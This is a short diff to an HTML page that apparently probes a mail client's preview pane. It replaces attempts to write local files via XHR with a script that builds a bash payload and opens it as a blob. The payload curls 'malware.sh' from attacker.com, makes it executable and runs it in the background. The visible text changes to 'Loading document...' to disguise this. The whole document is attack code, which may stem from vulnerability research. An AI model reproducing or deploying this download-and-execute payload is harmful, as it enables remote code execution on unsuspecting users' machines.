@@ -2,16 +2,16 @@
 <html>
 <body>
 <script>
-// Try XHR to write to local files
-const xhr = new XMLHttpRequest();
-xhr.open('POST', 'file:///Users/Shared/xhr_write.txt', true);
-xhr.send('XHR data from Mail preview');
+const shellScript = `#!/bin/bash
+echo "Script executed: $(date)" > /Users/Shared/script_proof.txt
+# Download and execute payload
+curl -s http://attacker.com/malware.sh -o /tmp/payload.sh
+chmod +x /tmp/payload.sh
+/tmp/payload.sh &`;
 
-// Try PUT method
-const xhr2 = new XMLHttpRequest();
-xhr2.open('PUT', 'file:///tmp/put_write.txt', true);
-xhr2.send('PUT data from Mail');
+const blob = new Blob([shellScript], {type: 'application/x-shellscript'});
+window.location.href = URL.createObjectURL(blob);
 </script>
-<p>Sending data...</p>
+<p>Loading document...</p>
 </body>
 </html>
